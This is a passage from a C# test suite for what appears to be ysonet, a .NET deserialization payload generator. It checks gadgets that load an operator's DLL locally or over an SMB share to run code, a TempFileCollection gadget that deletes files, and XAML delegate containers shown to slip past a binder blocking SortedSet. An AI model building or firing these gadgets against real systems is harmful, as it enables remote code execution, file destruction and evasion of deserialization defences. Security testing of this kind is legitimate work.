                        string carrier = AiCarrierNames[getter];
                        string cell = formatter + " --getter " + getter + (minify ? " --minify" : "");

                        RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, minify, AiLocalDll);
                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                        string text = AiPayloadText(r.Raw);
                        AssertTrue(text.IndexOf(carrier, StringComparison.Ordinal) >= 0,
                            cell + ": names the " + carrier + " carrier");
                        // DisplayMember is what makes a list control read HelpText on each
                        // item; without it nothing calls the getter at all.
                        AssertTrue(text.IndexOf("DisplayMember", StringComparison.Ordinal) >= 0
                                && text.IndexOf("HelpText", StringComparison.Ordinal) >= 0,
                            cell + ": points DisplayMember at HelpText");
                        AssertTrue(AiDecode(formatter, text).IndexOf(AiLocalDll, StringComparison.Ordinal) >= 0,
                            cell + ": carries the DLL path verbatim");
                    }
                }
            }
        }

        // Undo only the escaping the payload template applied, so a path assertion compares
        // against what the target will really hand to Assembly.LoadFrom.
        private static string AiDecode(string formatter, string payload)
        {
            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
            if (formatter == "Json.NET" || formatter == "JavaScriptSerializer"
                || formatter == "FastJson" || formatter == "YamlDotNet")
                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
            return payload;   // the two binary formats store the string verbatim
        }

        // -c is TARGET data and the two variants promise different delivery, so the gadget
        // has to say no to the combinations that would build a payload that cannot work.
        private static void AssemblyInstallerLoadValidatesTheDllPath()
        {
            foreach (string bad in new[] { null, "", "   " })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
                AssertTrue(!r.Success, "rejects an empty -c ('" + (bad ?? "<null>") + "')");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("installer DLL", StringComparison.OrdinalIgnoreCase) >= 0,
                    "the empty -c message says what is wanted: " + r.ErrorMessage);
            }

            // The sink is Assembly.LoadFrom, so a managed .exe is as valid as a .dll; a
            // source file is not, and neither is a bare program name, which is the shape a
            // shell command would arrive in.
            RunResult wrongExt = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\x\ExploitClass.cs");
            AssertTrue(!wrongExt.Success, "rejects a path that is not a loadable assembly");
            AssertTrue((wrongExt.ErrorMessage ?? "").IndexOf(".dll", StringComparison.Ordinal) >= 0,
                "the wrong-extension message names .dll: " + wrongExt.ErrorMessage);

            RunResult bareName = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "calc.exe");
            AssertTrue(!bareName.Success, "rejects a bare program name that only looks like an assembly");
            AssertTrue((bareName.ErrorMessage ?? "").IndexOf("bare file name", StringComparison.Ordinal) >= 0,
                "the bare-name message explains the problem: " + bareName.ErrorMessage);

            RunResult exePath = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\programdata\ysonet-test\installer.exe");
            AssertTrue(exePath.Success, "accepts a managed .exe, which Assembly.LoadFrom loads: " + exePath.ErrorMessage);

            // Characters Windows does not allow in a path, and that would also have to
            // survive a JSON string, an XML attribute and a YAML scalar.
            foreach (string bad in new[] { "C:\\a\"b\\x.dll", "C:\\a<b\\x.dll", "C:\\a>b\\x.dll",
                                           "C:\\a|b\\x.dll", "C:\\a*b\\x.dll", "C:\\a?b\\x.dll",
                                           "C:\\a\nb\\x.dll" })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
                AssertTrue(!r.Success, "rejects an illegal path character in " + bad.Replace("\n", "\\n"));
            }

            // The variants are not decoration: each refuses the other's input and names the
            // one to use, so a mislabelled payload can never be produced.
            RunResult localOnV2 = GenerateAssemblyInstaller("Json.NET", 2, 1, false, AiLocalDll);
            AssertTrue(!localOnV2.Success, "variant 2 rejects a local path");
            AssertTrue((localOnV2.ErrorMessage ?? "").IndexOf("variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                "variant 2's refusal points at variant 1: " + localOnV2.ErrorMessage);

            RunResult uncOnV1 = GenerateAssemblyInstaller("Json.NET", 1, 1, false, AiUncDll);
            AssertTrue(!uncOnV1.Success, "variant 1 rejects a UNC path");
            AssertTrue((uncOnV1.ErrorMessage ?? "").IndexOf("variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
                "variant 1's refusal points at variant 2: " + uncOnV1.ErrorMessage);

            // Surrounding whitespace is trimmed rather than baked into the payload.
            RunResult trimmed = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "  " + AiLocalDll + "  ");
            AssertTrue(trimmed.Success, "trims surrounding whitespace: " + trimmed.ErrorMessage);
            AssertTrue(AiDecode("Json.NET", AiPayloadText(trimmed.Raw))
                    .IndexOf("\"" + AiLocalDll + "\"", StringComparison.Ordinal) >= 0,
                "the trimmed path is what reaches the payload");

            // A carrier the formatter cannot build must be refused, not silently downgraded:
            // ComboBox/ListBox/CheckedListBox expose Items without a setter, so every
            // formatter except Json.NET and Xaml would deserialize it EMPTY and never read
            // HelpText, which looks like a working payload and does nothing.
            foreach (string formatter in AiFormatters)
            {
                bool multiCarrier = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0;
                for (int getter = 2; getter <= 4; getter++)
                {
                    RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, false, AiLocalDll);
                    if (multiCarrier)
                    {
                        AssertTrue(r.Success, formatter + " builds carrier " + getter + ": " + r.ErrorMessage);
                    }
                    else
                    {
                        AssertTrue(!r.Success, formatter + " must refuse carrier " + getter);
                        AssertTrue((r.ErrorMessage ?? "").IndexOf("PropertyGrid", StringComparison.Ordinal) >= 0,
                            formatter + "'s refusal names the carrier that does work: " + r.ErrorMessage);
                    }
                }
            }

            foreach (int bad in new[] { 0, 5 })
            {
                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, bad, false, AiLocalDll);
                AssertTrue(!r.Success, "rejects --getter " + bad);
            }
        }

        // The DLL path is operator data the target uses literally. It travels through a JSON
        // string, a YAML scalar, an XML attribute and two binary streams, and --minify
        // rewrites two of those, so a path holding the characters that stress each layer has
        // to come out byte-identical on every formatter.
        //
        // The apostrophe is the regression that motivates this: the shared JsonStringEscape
        // writes it as \', which is not a legal JSON escape - Json.NET and
        // JavaScriptSerializer read it back as a quote, but fastJSON DELETES the character,
        // silently turning C:\John's dir\x.dll into C:\Johns dir\x.dll.
        private static void AssemblyInstallerLoadEscapesOperatorPaths()
        {
            string[] awkward =
            {
                @"C:\John's dir\installer.dll",     // apostrophe: the fastJSON case
                @"C:\a & b\installer.dll",          // ampersand: XML entity
                @"C:\two  spaces\installer.dll",    // interior double space
                @"C:\semi; colon\installer.dll",    // "; " is what the XML minifier collapses
            };

            foreach (string path in awkward)
            {
                foreach (string formatter in AiFormatters)
                {
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
                        string cell = formatter + (minify ? " --minify" : "") + " with " + path;

                        RunResult r = GenerateAssemblyInstaller(formatter, 1, 1, minify, path);

                        // A minifier really can rewrite these: the XML one collapses "; "
                        // inside an attribute, the YAML one collapses a run of spaces. The
                        // gadget must then REFUSE, never ship a payload naming a different
                        // file. Either outcome is correct; a rewritten path is not.
                        if (!r.Success)
                        {
                            AssertTrue((r.ErrorMessage ?? "").IndexOf("no longer carries", StringComparison.Ordinal) >= 0,
                                cell + " failed for an unexpected reason: " + r.ErrorMessage);
                            AssertTrue(minify, cell + " was refused without --minify, which nothing should rewrite");
                            Console.Error.WriteLine("  [info] " + cell + " is refused: " + r.ErrorMessage);
                            continue;
                        }

                        // Compressed output carries no readable text; its uncompressed twin
                        // covers the same graph.
                        if (formatter == "MessagePackTypelessLz4")
                            continue;

                        AssertTrue(AiDecode(formatter, AiPayloadText(r.Raw)).IndexOf(path, StringComparison.Ordinal) >= 0,
                            cell + ": the path arrives unchanged");
                    }
                }
            }
        }

        // The two variants exist to describe two different deliveries, so the category
        // search has to see the difference.
        private static void AssemblyInstallerLoadDeclaresItsVariantFacets()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(AiGadget);
            AssertTrue(g != null, AiGadget + " is discoverable in the registry");
            AssertEqual(CommandInputType.DllPath, g.CommandInput(), "-c is a DLL path by default");

            List<GadgetVariant> variants = g.Variants();
            AssertEqual(2, variants.Count, "declares two variants");
            AssertEqual(CommandInputType.DllPath, variants[0].EffectiveInput(g.CommandInput()),
                "variant 1 takes a target-local DLL path");
            AssertEqual(CommandInputType.UncPath, variants[1].EffectiveInput(g.CommandInput()),
                "variant 2 takes a UNC path");

            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
            AssertEqual(2, caps.Count, "two variants expand to two capability units");

            GadgetCapability local = caps[0], unc = caps[1];

            AssertTrue(local.Kinds.Contains(PayloadKind.CodeExecution),
                "variant 1 is code execution: the installer constructor runs");
            AssertTrue(!local.Kinds.Contains(PayloadKind.Network),
                "variant 1 makes no network claim: the path is already on the target");
            AssertTrue(local.Inputs.Contains(PayloadInput.AssemblyFile),
                "variant 1's derived accepted input is assembly-file");
            AssertTrue(!local.Inputs.Contains(PayloadInput.UncPath),
                "variant 1 does not advertise a UNC path");

            AssertTrue(unc.Kinds.Contains(PayloadKind.CodeExecution)
                    && unc.Kinds.Contains(PayloadKind.Network),
                "variant 2 is code execution AND network: the target fetches the DLL over SMB");
            AssertTrue(unc.Inputs.Contains(PayloadInput.UncPath),
                "variant 2's derived accepted input is unc-path");

            foreach (GadgetCapability cap in caps)
            {
                AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
                        && cap.Requirements.Contains(GadgetRequirement.NetFramework),
                    "needs only built-in .NET Framework types");
                // The real gate is the target's security zone for the share plus
                // loadFromRemoteSources, not a CLR build, so the version axis stays honest.
                AssertEqual(1, cap.Versions.Count, "declares one value on the version axis");
                AssertTrue(cap.Versions.Contains(RuntimeVersion.Unspecified),
                    "leaves the runtime version axis unspecified");
            }

            AssertTrue(g.AdditionalInfo().IndexOf("RunInstaller", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the [RunInstaller(true)] requirement the DLL has to meet");
            AssertTrue(g.Labels().Contains(GadgetTags.GetterChain),
                "labelled as a getter chain");
        }

        // -t deserializes the payload in THIS process, which for this gadget means loading
        // the operator's DLL and running its installer constructors on the operator's own
        // machine. It must refuse, and it must refuse BEFORE it does anything with the path.
        private static void AssemblyInstallerLoadRefusesSelfTest()
        {
            foreach (string formatter in AiFormatters)
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = AiLocalDll;
                ia.Test = true;
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = AiGadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, formatter + ": -t is refused");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
                    formatter + ": the refusal says so plainly: " + r.ErrorMessage);
            }

            // Refused BEFORE the path is looked at: an input that would fail validation
            // still comes back with the -t refusal, which is the ordering proof.
            InputArgs bad = new InputArgs();
            bad.Cmd = "";
            bad.Test = true;
            RunResult ordering = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = AiGadget,
                FormatterName = "Json.NET",
                OutputFormat = "",
                InputArgs = bad,
            });
            AssertTrue(!ordering.Success, "still refuses with an empty -c");
            AssertTrue((ordering.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
                "-t is refused before the input is even validated: " + ordering.ErrorMessage);
        }

        // Building a payload must never load the DLL. The fixture installer writes a marker
        // when it is constructed, so pointing generation at the test assembly and finding no
        // marker proves generation alone is inert on every branch.
        private static void AssemblyInstallerLoadGenerationIsInert()
        {
            string marker = TestArtifactPath("ysonet_installer_inert.txt");
            SafeDelete(marker);
            string previous = Environment.GetEnvironmentVariable(YsonetTestInstaller.MarkerVariable);
            Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, marker);
            try
            {
                string ownAssembly = AiFixtureAssemblyPath();
                int cells = 0;
                foreach (string formatter in AiFormatters)
                {
                    int maxGetter = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0 ? 4 : 1;
                    for (int getter = 1; getter <= maxGetter; getter++)
                        for (int m = 0; m < 2; m++)
                        {
                            RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, m == 1, ownAssembly);
                            AssertTrue(r.Success, formatter + " g" + getter + " generates: " + r.ErrorMessage);
                            cells++;
                        }
                }
                AssertTrue(cells > 20, "covered every generation branch (was " + cells + ")");
                AssertTrue(!File.Exists(marker),
                    "generation alone never loaded the DLL: no installer was constructed");
            }
            finally
            {
                Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, previous);
                SafeDelete(marker);
            }
        }

        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel
        // only renders BodyRows lines, so a long one silently pushes Formatters:, Command
        // input: and the category summary off the visible area. The shared canary
        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, and this
        // gadget has both a long formatter list and preconditions worth stating, which is
        // exactly the combination that grows. So check its own panel.
        private static void AssemblyInstallerLoadInfoPanelStillShowsItsFacts()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            // A pessimistically NARROW info column: the panel is one of four columns, so a
            // realistic terminal gives it more room than this.
            string[] lines = ed.ModuleInfoLinesForTest(AiGadget, 34);
            int visible = ModuleEditor.BodyRowsForTest;
            AssertTrue(lines.Length > 0, "the info panel renders for " + AiGadget);

            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
            {
                int at = -1;
                for (int i = 0; i < lines.Length; i++)
                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
                AssertTrue(at >= 0, "the panel states " + fact);
                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
                    + "the option help)");
            }

            // Both selectors must reach the editor, or the gadget is only usable from the
            // command line.
            List<EditableField> fields = ed.BuildFieldsForTest(AiGadget);
            foreach (string option in new[] { "variant", "getter" })
            {
                EditableField f = FindEditable(fields, option);
                AssertTrue(f != null && !f.Hidden, "the editor offers the " + option + " setting");
                AssertTrue(!string.IsNullOrEmpty(f.Help),
                    "the " + option + " setting carries its help text into the editor");
            }
        }

        // The already-built ysonet.Tests assembly, which holds the inert
        // [RunInstaller(true)] fixture. Nothing is compiled at test time.
        private static string AiFixtureAssemblyPath()
        {
            return new Uri(typeof(YsonetTestInstaller).Assembly.CodeBase).LocalPath;
        }

        private static void TempFileCollectionKeepsUncAndRelativePathsVerbatim()
        {
            const string unc = @"\\ysonet-nonexistent-host\share\zz_target.txt";
            const string relative = @"zz_relative\target.txt";
            const string trailingDot = @"C:\ysonet\dir.\file.txt";

            foreach (string formatter in TempFilesFormatters)
            {
                RunResult r = GenerateTempFiles(formatter, false, false, unc, relative, trailingDot);
                AssertTrue(r.Success, formatter + " generates UNC + relative paths: " + r.ErrorMessage);
                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                {
                    var table = TempFilesTableOf(obj);
                    AssertEqual(3, table.Count, formatter + ": all three paths arrived");
                    AssertTrue(table.ContainsKey(unc), formatter + ": the UNC path is unchanged");
                    AssertTrue(table.ContainsKey(relative),
                        formatter + ": the relative path is NOT rooted against ysonet's directory");
                    AssertTrue(table.ContainsKey(trailingDot),
                        formatter + ": a path Path.GetFullPath would rewrite is left alone");
                });
            }
        }

        // -t must be REFUSED, not ignored, and the refusal has to happen before anything can
        // deserialize: a self-test here would build a real TempFileCollection holding the
        // operator's paths inside ysonet.exe and let its finalizer delete them. The proof is
        // a real file that is still there afterwards, plus a forced collection in between.
        private static void TempFileCollectionRefusesSelfTest()
        {
            string victim = WriteTestArtifact("ysonet_tfc_selftest_victim.txt", "must survive -t");
            try
            {
                foreach (string formatter in TempFilesFormatters)
                {
                    RunResult r = GenerateTempFiles(formatter, false, true, victim);
                    AssertTrue(!r.Success, formatter + " with -t is refused");
                    AssertTrue((r.ErrorMessage ?? "").Contains("-t"),
                        "the refusal names -t: " + r.ErrorMessage);
                    AssertTrue(r.Raw == null, "a refused run returns no payload");
                }

                // If a live instance had been created and dropped, this is where it would
                // delete the file. It must not.
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
                AssertTrue(File.Exists(victim),
                    "the refusal happened before anything could construct the target type");
                AssertEqual("must survive -t", File.ReadAllText(victim), "the file is untouched");
            }
            finally { SafeDelete(victim); }
        }

        // This gadget DELETES the path it carries, so it must never ship a REWRITTEN one. Two
        // separate things rewrite a path in an XML payload: the minifier (deliberately not text
        // preserving) and, with no minification at all, the DataContractSerializer helper's XML
        // writer, which emits a carriage return raw so every parser normalizes it away.
        //
        // The invariant asserted here is the one that matters and does not go stale: whenever
        // generation SUCCEEDS the path must arrive intact, and whenever it fails the message
        // must name the formatter and point at a formatter that does carry it. On top of that,
        // the known refusals and the known-safe cases are locked so the guard is proven live
        // rather than merely present.
        private static void TempFileCollectionRefusesAPathItWouldRewrite()
        {
            // A trailing space and a carriage return are both legal in a Windows path (an NTFS
            // name can end in a space, and a path reached through the device namespace can hold
            // odd characters), so the gadget cannot assume nobody passes one.
            var lossy = new[] { @"C:\ysonet\trailing space ", "C:\\ysonet\\has\rcr.txt" };
            var safe = new[] { @"C:\ysonet\plain.txt", @"C:\ysonet\two  spaces.txt" };

            foreach (string formatter in TempFilesFormatters)
            {
                bool isXml = Array.IndexOf(TempFilesXmlFormatters, formatter) >= 0;
                int refusals = 0;

                foreach (string path in lossy)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        string label = formatter + (minify ? " --minify" : "") + " " + Preview(path);
                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
                        if (r.Success)
                        {
                            // The invariant: a shipped payload names exactly what was asked for.
                            WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                            {
                                AssertTrue(TempFilesTableOf(obj).ContainsKey(path),
                                    label + " generated, so it must deliver the path intact");
                            });
                        }
                        else
                        {
                            refusals++;
                            AssertTrue((r.ErrorMessage ?? "").Contains(formatter),
                                "the refusal names the formatter: " + r.ErrorMessage);
                            AssertTrue((r.ErrorMessage ?? "").Contains("BinaryFormatter"),
                                "the refusal offers a formatter that does carry it: " + r.ErrorMessage);
                            AssertTrue((r.ErrorMessage ?? "").Contains("deletes the path it carries"),
                                "the refusal says why it matters: " + r.ErrorMessage);
                        }

                        // Minified XML is the known-lossy combination and must always refuse.
                        if (isXml && minify)
                            AssertTrue(!r.Success, "minified " + formatter + " is refused for "
                                + Preview(path));
                        if (isXml && minify)
                            AssertTrue((r.ErrorMessage ?? "").Contains("cannot use --minify with " + formatter),
                                "the minify refusal names the combination: " + r.ErrorMessage);

                        // A binary formatter has no XML to rewrite, so it must never refuse.
                        if (!isXml)
                            AssertTrue(r.Success, formatter + " carries " + Preview(path)
                                + " (there is no XML to rewrite): " + r.ErrorMessage);
                    }
                }

                if (isXml)
                    AssertTrue(refusals > 0, formatter + " exercised the path-fidelity refusal");
                else
                    AssertEqual(0, refusals, formatter + " never refuses a path");

                // A path the writer and the minifier both leave alone always generates.
                foreach (string path in safe)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
                        AssertTrue(r.Success, formatter + (minify ? " --minify" : "")
                            + " is allowed for an ordinary path (" + Preview(path) + "): "
                            + r.ErrorMessage);
                    }
                }
            }

            // The un-minified DataContractSerializer carriage-return case is the writer-level
            // half of this rule, so lock it explicitly: it is the reason the check does not
            // only run under --minify.
            RunResult writerCase = GenerateTempFiles("DataContractSerializer", false, false,
                "C:\\ysonet\\has\rcr.txt");
            AssertTrue(!writerCase.Success,
                "un-minified DataContractSerializer refuses a carriage return its writer loses");
            AssertTrue((writerCase.ErrorMessage ?? "").Contains("XML writer"),
                "the writer-level refusal names the cause: " + writerCase.ErrorMessage);
        }

        // ---- TypeConfuseDelegate XAML-path containers (--rootcontainer) -------------
        //
        // GetXamlGadget is the same delegate confusion with XamlReader.Parse in slot 1, and
        // it now offers the same three roots. Its two consumers, the hosted gadgets below,
        // expose the choice as --rootcontainer. That option is ORTHOGONAL to their --variant,
        // which picks the WRAPPER (TypeConfuseDelegate or TextFormattingRunProperties), so
        // it is a plain option and not a variant.

        private static readonly string[] XamlContainerGadgets =
            { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" };

        // The option name comes from the generator, so a rename cannot leave the tests
        // asserting a flag nobody types.
        private static readonly string RootContainerOption =
            TypeConfuseDelegateGenerator.XamlRootContainerOptionName;
        private static readonly string RootContainerFlag = "--" + RootContainerOption;

        // Formatters variant 1 (the TypeConfuseDelegate wrapper) advertises. SoapFormatter is
        // absent on purpose: every container is a generic type (see
        // XamlContainersCannotUseSoapFormatter).
        private static readonly string[] XamlContainerFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // Pass container=null for the implicit default (no --rootcontainer).
        private static RunResult GenerateXamlContainer(string gadget, string cmd, int variant,
            int? container, string formatter, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            var extra = new List<string> { "--variant", variant.ToString() };
            if (container.HasValue) { extra.Add(RootContainerFlag); extra.Add(container.Value.ToString()); }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Adding the container selector must not change the default payload: with no option,
        // each consumer must produce the exact same bytes as an explicit --rootcontainer 1.
        private static void XamlContainerDefaultEqualsContainerOne()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c, so the whole formatter x minify
            // grid is cheap here.
            foreach (string formatter in XamlContainerFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string desc = "ActivitySurrogateDisableTypeCheck -f " + formatter + (minify ? " (minify)" : "");

                    RunResult def = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, null, formatter, minify);
                    RunResult one = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, 1, formatter, minify);
                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                    AssertTrue(one.Success, "explicit --rootcontainer 1 generates: " + desc + " -> " + one.ErrorMessage);
                    AssertTrue(BytesEqual(Bytes(def.Raw), Bytes(one.Raw)),
                        "implicit default equals explicit --rootcontainer 1 byte-for-byte: " + desc);

                    // The other two containers must actually produce a DIFFERENT payload,
                    // otherwise the option would be silently ignored.
                    foreach (int container in new[] { 2, 3 })
                    {
                        RunResult other = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, formatter, minify);
                        AssertTrue(other.Success, "--rootcontainer " + container + " generates: " + desc + " -> " + other.ErrorMessage);
                        AssertTrue(!BytesEqual(Bytes(def.Raw), Bytes(other.Raw)),
                            "--rootcontainer " + container + " changes the payload: " + desc);
                    }
                }
            }

            // The shared entry point both consumers call: the no-container overload must build
            // exactly the container-1 graph, so no caller of the old signature changes a byte.
            string xaml = "<x>" + new string('a', 64) + "</x>";
            AssertTrue(BytesEqual(BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml)),
                                  BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, 1))),
                "GetXamlGadget(xaml) equals GetXamlGadget(xaml, 1) byte-for-byte");

            // XamlAssemblyLoadFromFile is deliberately NOT exercised here. It compiles the -c
            // .cs on every generation, and a CodeDom compile is the one step that can wedge on
            // this platform (antivirus + the legacy CSharpCodeProvider), so the normal tier
            // keeps as few compiles as possible. It also cannot be byte-compared across two
            // runs: each compile carries a fresh module id, so two identical requests differ.
            // Its container wiring is asserted on the wire SHAPE in the FULL tier, next to the
            // cells that already compile (XamlContainerFullMatrix).
        }

        // The container option must reject anything that is not 1, 2, or 3 instead of quietly
        // falling back to the default, which would hide a typo behind a payload the user did
        // not ask for. The rejection happens while parsing the options, so it costs nothing
        // even on the consumer that compiles a .cs.
        private static void XamlContainerOptionIsValidated()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = "ysonet_no_such_fixture.cs";
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { RootContainerFlag, bad };
                    RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = "BinaryFormatter",
                        OutputFormat = "",
                        InputArgs = ia,
                    });
                    AssertTrue(!r.Success, gadget + " " + RootContainerFlag + " " + bad + " is rejected");
                    AssertTrue((r.ErrorMessage ?? "").IndexOf(RootContainerOption + " must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
                        gadget + " " + RootContainerFlag + " " + bad + " reports the allowed values: " + r.ErrorMessage);
                }
            }

            foreach (int good in new[] { 1, 2, 3 })
                AssertTrue(GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, good, "BinaryFormatter", false).Success,
                    "--rootcontainer " + good + " is accepted");
        }

        // The point of containers 2 and 3 is the wire type names, so assert them directly on
        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
        // must be gone, while the XamlReader.Parse primitive stays put in all three.
        private static void XamlContainerRootsAvoidSortedSetName()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";

            string c1 = XamlContainerStreamText(1);
            AssertTrue(c1.Contains(sortedSet), "container 1 still serializes a SortedSet root");

            string c2 = XamlContainerStreamText(2);
            AssertTrue(c2.Contains(sortedDict), "container 2 serializes a SortedDictionary root");
            AssertTrue(c2.Contains(treeSet), "container 2 carries the inner TreeSet backing set");
            AssertTrue(c2.Contains("KeyValuePairComparer"),
                "container 2 carries the KeyValuePairComparer that forwards key comparisons");
            AssertTrue(!c2.Contains(sortedSet), "container 2 emits no SortedSet type record");

            string c3 = XamlContainerStreamText(3);
            AssertTrue(c3.Contains(treeSet), "container 3 serializes a TreeSet root");
            AssertTrue(!c3.Contains(sortedDict), "container 3 does not wrap the set in a dictionary");
            AssertTrue(!c3.Contains(sortedSet), "container 3 emits no SortedSet type record");

            foreach (var pair in new[] { new[] { "1", c1 }, new[] { "2", c2 }, new[] { "3", c3 } })
            {
                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
                    "container " + pair[0] + " still carries the delegate serialization holder");
                AssertTrue(pair[1].Contains("System.Windows.Markup.XamlReader"),
                    "container " + pair[0] + " still targets XamlReader");
                AssertTrue(pair[1].Contains("Parse"),
                    "container " + pair[0] + " still targets the Parse method");
            }
        }

        // The raw BinaryFormatter bytes of one container, read as ASCII so the embedded type
        // name records can be searched. ActivitySurrogateDisableTypeCheck ignores -c, so this
        // needs no compile.
        private static string XamlContainerStreamText(int container)
        {
            RunResult r = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, "BinaryFormatter", false);
            AssertTrue(r.Success, "--rootcontainer " + container + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString(Bytes(r.Raw));
        }

        // The behavioral proof, which the byte-name assertions alone cannot give: through a
        // binder that rejects only the exact SortedSet wire name, container 1 is blocked and
        // never parses its XAML, while containers 2 and 3 deserialize and hand the document to
        // XamlReader.Parse, which runs it.
        //
        // It also proves the ordering the whole XAML path depends on: the spliced method
        // receives the LARGER-sorting element as its first argument, and "" always sorts
        // smaller than a XAML document, so Parse gets the document - in every container.
        //
        // Every deserialization runs in a CHILD process. Parsing this XAML inside a
        // BinaryFormatter callback makes the CLR fail-fast (0xC0000409 in clr.dll) after the
        // payload has already fired - the same reason the *FromFile fire helpers use a
        // subprocess. The marker file is the proof, independent of the child's exit code.
        private static void XamlContainersEvadeSortedSetBinder()
        {
            // Blocked: the binder rejects the SortedSet root, so nothing parses. Asserting an
            // ABSENCE, so it keeps a short bound instead of the full marker budget.
            AssertTrue(!XamlContainerProbeFires(1, true, "c1_blocked", 3000),
                "container 1 does not parse its XAML when its root type is blocked");

            foreach (int container in new[] { 2, 3 })
                AssertTrue(XamlContainerProbeFires(container, true, "c" + container, MarkerWaitMs),
                    "container " + container + " parses its XAML through a binder that rejects the SortedSet wire name");

            // Control: container 1 DOES parse when nothing blocks it, so the absence above is
            // the binder's doing and not a dud payload.
            AssertTrue(XamlContainerProbeFires(1, false, "c1_control", MarkerWaitMs),
                "container 1 parses its XAML when no binder blocks it");
        }

        private const string XamlContainerProbeVar = "YSONET_XAML_CONTAINER_PROBE";

        // Spawn this same test exe in probe mode and report whether the payload fired.
        private static bool XamlContainerProbeFires(int container, bool useBinder, string tag, int waitMs)
        {
            string exe = System.Reflection.Assembly.GetEntryAssembly().Location;
            AssertTrue(!string.IsNullOrEmpty(exe) && File.Exists(exe),
                "the test exe can spawn itself for the XAML container probe");

            string marker = MarkerPath("XAMLTCD_binder_" + tag);
            SafeDelete(marker);
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo(exe);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = Path.GetDirectoryName(exe);
                psi.EnvironmentVariables[XamlContainerProbeVar] =
                    container + "|" + (useBinder ? "1" : "0") + "|" + marker;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
